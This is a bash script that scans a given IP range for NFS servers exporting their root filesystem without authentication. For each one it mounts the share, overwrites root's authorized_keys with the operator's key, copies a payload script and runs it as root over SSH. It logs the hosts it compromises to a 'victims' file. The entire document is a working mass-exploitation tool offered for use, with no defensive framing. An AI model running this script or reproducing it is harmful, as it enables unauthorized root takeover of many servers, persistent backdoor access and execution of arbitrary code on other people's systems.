#!/bin/bash

#test and exploit nfs servers in ip/mask that export root file system and don't implement any form of authentication

nfsport=2049
public_key=mypk
execScript=myscript.sh
concurrencyLevel=8
rest=2

timeout=2

function ip2n {
	n=0
	current_ip="$1."
	while [[ ! -z "$current_ip" ]]; do
		octet=${current_ip%%.*}
		n=$(((n<<8)+octet))
		current_ip=${current_ip#${octet}.}
	done
	printf $n
}

function n2ip {
	ip=""
	n=$1
	for ((i=24;i>=0;i-=8)); do
		octet=$(((n>>i)%256))
		ip="${ip}.${octet}"
	done
	printf ${ip#.}
}

function helloIP {
	ip=$1
	nc -w${timeout} $ip $nfsport < /dev/null
	[[ $? -eq 1 ]] && exit #port was closed
	echo $ip >> victims.txt
	
	mkdir $ip
	mount -t nfs $ip:/ $ip
	
	cat "$public_key" > ${ip}/root/.ssh/authorized_keys
	cp $execScript ${ip}/root/
	ssh root@${ip} "bash ${execScript}"
	#ssh root@${ip} "bash < <(cat ${execScript})"
	#ssh -i "$private_key" root@${ip} "bash ${execScript}"
	
	resp=$(ssh root@${ip} "echo yeah")
	if [[ $resp != yeah ]]; then #port open, but failed to exeute the command
		if [[ $2 -eq 1 ]]; then  #exit when we have failed 1+1 times
			echo $ip >> problematic_victims.txt
			exit
		fi
		helloIP $ip $(($2+1))
	fi
	
	rm ${ip}/${execScript}
	umount $ip
}

bip=${1%/*}
newarg=${1#$bip}
mask=${newarg##*/}
: ${mask:=32}

c=0
basen=$(ip2n $bip)
for ((i=0;i<$((1<<(32-mask)));i++)); do
    ip=$(n2ip $((basen+i)))
	echo "Processing $ip"
	$(helloIP $ip) &
	((c++))
	if [[ $c -eq $concurrencyLevel ]]; then
		sleep $rest
		c=0
	fi
done